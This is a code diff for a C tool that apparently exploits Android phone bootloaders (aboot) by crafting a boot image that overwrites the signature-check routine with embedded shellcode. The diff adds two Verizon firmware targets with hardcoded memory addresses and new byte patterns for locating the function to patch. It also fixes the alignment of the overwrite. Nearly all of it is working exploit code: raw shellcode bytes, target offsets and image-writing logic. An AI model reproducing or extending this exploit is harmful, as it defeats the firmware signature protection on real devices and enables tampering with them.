@@ -16,7 +16,7 @@
 #include <stdlib.h>
 #include <unistd.h>
 
-#define VERSION "1.2"
+#define VERSION "1.3"
 
 #define BOOT_MAGIC_SIZE 8
 #define BOOT_NAME_SIZE 16
@@ -73,12 +73,26 @@ struct target targets[] = {
 		.check_sigs = 0x88e0fcd8,
 		.hdr = 0x88f0b2fc,
 	},
+	{
+		.vendor = "Verizon",
+		.build = "IMM76D.I200VRALH2",
+		.check_sigs = 0x88e0f5c0,
+		.hdr = 0x88ed32e0,
+	},
+	{
+		.vendor = "Verizon",
+		.build = "JZO54K.I200VRBMA1",
+		.check_sigs = 0x88e101ac,
+		.hdr = 0x88ed72e0,
+	}
 };
 
-#define PATTERN "\xf0\xb5\x8f\xb0\x06\x46\xf0\xf7"
+#define PATTERN1 "\xf0\xb5\x8f\xb0\x06\x46\xf0\xf7"
+#define PATTERN2 "\xf0\xb5\x8f\xb0\x07\x46\xf0\xf7"
+#define PATTERN3 "\x2d\xe9\xf0\x41\x86\xb0\xf1\xf7"
 #define ABOOT_BASE 0x88dfffd8
 
-unsigned char patch[] = 
+unsigned char patch[] =
 "\xfe\xb5"
 "\x0b\x4d"
 "\xa8\x6a"
@@ -125,7 +139,7 @@ int patch_shellcode(unsigned int addr)
 int main(int argc, char **argv)
 {
 
-	int ifd, ofd, aboot_fd, pos, i, recovery;
+	int ifd, ofd, aboot_fd, pos, i, recovery, offset;
 	unsigned int orig_ramdisk_size, orig_kernel_size, page_kernel_size, page_ramdisk_size, page_size, page_mask;
 	unsigned long target;
 	void *orig, *aboot, *ptr;
@@ -185,11 +199,13 @@ int main(int argc, char **argv)
 	target = 0;
 
 	for (ptr = aboot; ptr < aboot + st.st_size - 0x1000; ptr++) {
-		if (!memcmp(ptr, PATTERN, 8)) {
+		if (!memcmp(ptr, PATTERN1, 8) ||
+			!memcmp(ptr, PATTERN2, 8) ||
+			!memcmp(ptr, PATTERN3, 8)) {
 			target = (unsigned long)ptr - (unsigned long)aboot + ABOOT_BASE;
 			break;
 		}
-	}	
+	}
 
 	if (!target) {
 		printf("[-] Failed to find function to patch.\n");
@@ -264,17 +280,21 @@ int main(int argc, char **argv)
 
 	/* Ramdisk must be aligned to a page boundary */
 	hdr->kernel_size = ((hdr->kernel_size + page_mask) & ~page_mask) + hdr->ramdisk_size;
-	hdr->ramdisk_addr = tgt->check_sigs - 8;	
+
+	/* Guarantee 16-byte alignment */
+	offset = tgt->check_sigs & 0xf;
+
+	hdr->ramdisk_addr = tgt->check_sigs - offset;
 	hdr->ramdisk_size = 0;
 
-	/* Write the image header */	
+	/* Write the image header */
 	if (write(ofd, orig, page_size) != page_size) {
 		printf("[-] Failed to write header to output file.\n");
 		return 1;
 	}
 
 	page_kernel_size = (orig_kernel_size + page_mask) & ~page_mask;
-	
+
 	/* Write the kernel */
 	if (write(ofd, orig + page_size, page_kernel_size) != page_kernel_size) {
 		printf("[-] Failed to write kernel to output file.\n");
@@ -296,7 +316,7 @@ int main(int argc, char **argv)
 		return 1;
 	}
 
-	lseek(aboot_fd, tgt->check_sigs - ABOOT_BASE - 8, SEEK_SET);
+	lseek(aboot_fd, tgt->check_sigs - ABOOT_BASE - offset, SEEK_SET);
 	read(aboot_fd, buf, 0x200);
 
 	if (write(ofd, buf, 0x200) != 0x200) {
@@ -305,7 +325,7 @@ int main(int argc, char **argv)
 	}
 
 	pos = lseek(ofd, 0, SEEK_CUR);
-	lseek(ofd, pos - 0x1f8, SEEK_SET);
+	lseek(ofd, pos - (0x200 - offset), SEEK_SET);
 
 	/* Write the patch */
 	if (write(ofd, patch, sizeof(patch)) != sizeof(patch)) {
